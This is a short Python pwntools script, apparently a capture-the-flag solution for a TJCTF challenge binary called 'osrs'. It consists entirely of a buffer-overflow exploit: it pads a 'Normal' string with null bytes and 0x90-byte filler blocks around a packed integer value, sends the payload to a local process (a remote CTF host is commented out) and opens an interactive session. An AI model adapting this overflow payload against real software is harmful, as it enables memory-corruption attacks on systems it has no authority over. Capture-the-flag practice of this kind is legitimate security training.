from pwn import *
#r=remote("p1.tjctf.org",8006)
r=process("./osrs")

pay="Normal"+'\x00'*10
pay+='x'*0x90
pay+=p32(0x1)
pay+='x'*0x90



r.sendline(pay)

r.interactive()
